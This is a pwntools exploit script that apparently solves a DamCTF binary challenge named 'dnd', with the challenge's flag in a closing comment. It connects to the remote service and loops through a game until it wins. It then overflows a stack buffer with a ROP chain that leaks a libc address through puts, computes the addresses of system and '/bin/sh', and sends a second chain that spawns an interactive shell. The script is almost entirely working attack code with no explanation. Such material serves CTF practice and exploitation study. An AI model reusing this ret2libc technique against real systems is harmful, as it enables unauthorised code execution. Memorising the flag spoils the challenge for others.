from pwn import *

# not alway successful, remember try many times

exe = ELF("./dnd_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
b *0x4028B8
b *0x40295F
'''

p = remote("dnd.chals.damctf.xyz", 30813)
#p = process("./dnd_patched")
#debug()
#p = gdb.debug("./dnd_patched", gdbscript = script)

p_sla(b"[r]un? ", b"a")

while(True):
    s = p.recv(3)
    if(s == b"You"):
        p.recvuntil(b"monster!\n")
        s = p.recv(4)
        if(s == b"Cong"):
            break
    elif(s == b"Oof"):
        p.recvuntil(b";(\n")
        s = p.recv(4)
        if(s == b"Cong"):
            break
    print(s, len(s))
    p_sla(b"[r]un? ", b"a")

pop_rdi_rbp = 0x0000000000402640
puts_got = exe.got['puts']
puts_plt = exe.plt['puts']
main = 0x4028A5

payload = b"A" * 0x60
payload += p64(0) + p64(pop_rdi_rbp)
payload += p64(puts_got) + p64(0x408800)
payload += p64(puts_plt) + p64(main)

p_sla(b"warrior? ", payload)

p.recvuntil(b"A" * 0x20)
p.recv(7)
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x87be0
print(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

payload = b"B" * 0x60
payload += p64(0) + p64(pop_rdi_rbp)
payload += p64(binsh) + p64(0)
payload += p64(system)
p_sl(payload)

p.interactive()
#dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}